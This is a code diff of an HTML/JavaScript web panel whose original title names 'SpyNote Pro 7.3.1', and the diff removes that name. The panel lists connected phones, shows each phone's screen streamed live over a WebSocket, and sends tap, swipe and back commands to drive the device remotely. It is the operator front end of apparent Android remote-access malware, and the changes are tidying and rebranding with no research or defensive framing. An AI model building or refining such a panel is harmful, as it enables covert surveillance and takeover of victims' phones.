@@ -1,76 +1,202 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SpyNote Pro 7.3.1 - Control Panel</title>
+    <title>Control Panel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <script src="/socket.io/socket.io.js"></script>
+
+    <!-- ❌ socket.io REMOVED -->
+
     <style>
         body { margin: 0; font-family: Arial; background: #1a1a1a; color: white; }
-        #devices { position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 10px; max-height: 400px; overflow-y: auto; }
-        .device { padding: 8px; margin: 4px; background: #333; cursor: pointer; border-radius: 4px; }
+        #devices {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            max-height: 400px;
+            overflow-y: auto;
+            width: 220px;
+        }
+        .device {
+            padding: 8px;
+            margin: 4px 0;
+            background: #333;
+            cursor: pointer;
+            border-radius: 4px;
+        }
         .device:hover { background: #555; }
-        .active { background: #00ff00 !important; }
-        #phone-frame { 
-            width: 400px; height: 800px; 
-            margin: 20px auto; 
-            background: #000; 
-            border: 20px solid #333; 
-            border-radius: 40px; 
+        .active { background: #00ff00 !important; color: #000; }
+
+        #phone-frame {
+            width: 400px;
+            height: 800px;
+            margin: 20px auto;
+            background: #000;
+            border: 20px solid #333;
+            border-radius: 40px;
             position: relative;
             cursor: pointer;
             touch-action: none;
         }
+
         #screen { width: 100%; height: 100%; background: #111; }
+
         #controls { text-align: center; margin: 20px; }
-        button { padding: 12px 24px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; }
+        button {
+            padding: 12px 24px;
+            margin: 5px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
         button:hover { background: #0056b3; }
     </style>
 </head>
+
 <body>
-    <div id="devices">
-        <h3>Connected Devices</h3>
-        <div id="device-list"></div>
-    </div>
 
-    <div id="phone-frame">
-        <canvas id="screen"></canvas>
-    </div>
+<div id="devices">
+    <h3>Connected Devices</h3>
+    <div id="device-list">Loading...</div>
+</div>
 
-    <div id="controls">
-        <button onclick="sendBack()">Back</button>
-        <button onclick="sendHome()">Home</button>
-        <button onclick="toggleFullScreen()">Fullscreen</button>
-    </div>
+<div id="phone-frame">
+    <canvas id="screen"></canvas>
+</div>
 
-   <script>
-const ws = new WebSocket(`ws://${location.host}?role=panel`);
+<div id="controls">
+    <button onclick="sendBack()">Back</button>
+    <button onclick="toggleFullScreen()">Fullscreen</button>
+</div>
+
+<script>
+/* ===============================
+   WEBSOCKET (AUTO ws / wss)
+================================ */
+const wsProtocol = location.protocol === "https:" ? "wss" : "ws";
+const ws = new WebSocket(wsProtocol + "://" + location.host + "?role=panel");
+
 let currentDevice = null;
 
 const canvas = document.getElementById('screen');
 const ctx = canvas.getContext('2d');
+const phoneFrame = document.getElementById('phone-frame');
 
+/* ===============================
+   RECEIVE SCREEN
+================================ */
 ws.onmessage = e => {
-  const d = JSON.parse(e.data);
-  if (d.type === 'screen' && d.deviceId === currentDevice) {
-    const img = new Image();
-    img.onload = () => {
-      canvas.width = img.width;
-      canvas.height = img.height;
-      ctx.drawImage(img, 0, 0);
-    };
-    img.src = 'data:image/jpeg;base64,' + d.data;
-  }
+    const data = JSON.parse(e.data);
+
+    if (data.type === "screen" && data.deviceId === currentDevice) {
+        const img = new Image();
+        img.onload = () => {
+            canvas.width = img.width;
+            canvas.height = img.height;
+            ctx.drawImage(img, 0, 0);
+        };
+        img.src = "data:image/jpeg;base64," + data.data;
+    }
 };
 
-function sendTap(x,y){
-  ws.send(JSON.stringify({ action:'tap', deviceId:currentDevice, x,y }));
+/* ===============================
+   LOAD DEVICES
+================================ */
+fetch('/devices')
+    .then(r => r.json())
+    .then(devices => {
+        const list = document.getElementById('device-list');
+        list.innerHTML = '';
+
+        if (devices.length === 0) {
+            list.innerHTML = 'No devices';
+            return;
+        }
+
+        devices.forEach(([id, info]) => {
+            const div = document.createElement('div');
+            div.className = 'device';
+            div.innerHTML = `
+                <b>${info.model || id}</b><br>
+                <small>${info.version || ''}</small>
+            `;
+            div.onclick = () => selectDevice(id, div);
+            list.appendChild(div);
+        });
+    });
+
+function selectDevice(deviceId, el) {
+    currentDevice = deviceId;
+    document.querySelectorAll('.device')
+        .forEach(d => d.classList.remove('active'));
+    el.classList.add('active');
 }
-function sendSwipe(sx,sy,ex,ey){
-  ws.send(JSON.stringify({ action:'swipe', deviceId:currentDevice,
-    startX:sx,startY:sy,endX:ex,endY:ey }));
+
+/* ===============================
+   TOUCH CONTROLS
+================================ */
+let startX = 0, startY = 0, dragging = false;
+
+phoneFrame.addEventListener('mousedown', e => {
+    dragging = true;
+    startX = e.offsetX;
+    startY = e.offsetY;
+    sendTap(startX, startY);
+});
+
+phoneFrame.addEventListener('mousemove', e => {
+    if (!dragging) return;
+    sendSwipe(startX, startY, e.offsetX, e.offsetY);
+});
+
+phoneFrame.addEventListener('mouseup', e => {
+    dragging = false;
+});
+
+/* ===============================
+   SEND COMMANDS
+================================ */
+function sendTap(x, y) {
+    if (!currentDevice) return;
+    ws.send(JSON.stringify({
+        action: "tap",
+        deviceId: currentDevice,
+        x, y
+    }));
 }
-function sendBack(){
-  ws.send(JSON.stringify({ action:'back', deviceId:currentDevice }));
+
+function sendSwipe(sx, sy, ex, ey) {
+    if (!currentDevice) return;
+    ws.send(JSON.stringify({
+        action: "swipe",
+        deviceId: currentDevice,
+        startX: sx,
+        startY: sy,
+        endX: ex,
+        endY: ey
+    }));
+}
+
+function sendBack() {
+    if (!currentDevice) return;
+    ws.send(JSON.stringify({
+        action: "back",
+        deviceId: currentDevice
+    }));
+}
+
+/* ===============================
+   FULLSCREEN
+================================ */
+function toggleFullScreen() {
+    if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen();
+    } else {
+        document.exitFullscreen();
+    }
 }
 </script>
 
